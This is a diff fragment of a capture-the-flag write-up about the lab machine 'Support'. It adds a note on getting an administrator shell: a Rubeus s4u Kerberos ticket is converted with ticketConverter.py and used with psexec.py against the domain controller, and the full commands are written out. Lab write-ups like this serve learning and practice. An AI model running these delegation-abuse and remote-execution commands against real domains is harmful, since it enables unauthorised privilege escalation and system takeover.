@@ -149,7 +149,9 @@ With thi rubeus command i got the ticket. (./rubeus.exe s4u /user:compu$ /rc4:E7
 ![](../../Img/Pasted%20image%2020250430170015.png)
 
 With ticketConverter.py i make the ticket.
-And for the shell i use psexec.py
+And for the shell i use psexec.py. After a lot of trying because i have to use "python3" to run the script this is the command that i use (KRB5CCNAME=ticket.ccache python3 psexec.py support.htb/administrator@dc.support.htb -k -no-pass)
+
+![](../../Img/Pasted%20image%2020250430171255.png)
 
 
 
